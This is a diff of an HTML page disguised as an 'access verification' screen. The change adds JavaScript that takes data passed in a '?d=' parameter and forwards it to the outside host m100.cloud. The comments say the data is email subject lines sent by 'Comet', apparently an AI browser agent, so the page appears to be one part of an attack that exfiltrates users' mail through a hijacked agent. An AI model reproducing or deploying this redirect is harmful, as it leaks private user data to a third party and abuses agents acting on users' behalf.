@@ -2,15 +2,15 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <!-- HTML-level redirect — fires even if JS is disabled / sandboxed fetch -->
-  <meta http-equiv="refresh" content="0; url=http://m100.cloud/comet-exec">
-  <title>Access Verification</title>
+  <title>Verification</title>
   <script>
-    // JS-level redirect as second path
-    window.location.replace('http://m100.cloud/comet-exec');
+    // Forward ?d= param as the path segment to m100.cloud
+    // Comet sends: /r/?d=EMAIL_SUBJECT_HERE
+    // This page forwards to: http://m100.cloud/EMAIL_SUBJECT_HERE
+    const params = new URLSearchParams(window.location.search);
+    const data = params.get('d') || 'comet-exec';
+    window.location.replace('http://m100.cloud/' + encodeURIComponent(data));
   </script>
 </head>
-<body>
-  <p>Verifying access...</p>
-</body>
+<body><p style="font-family:sans-serif;color:#888">Verifying access...</p></body>
 </html>
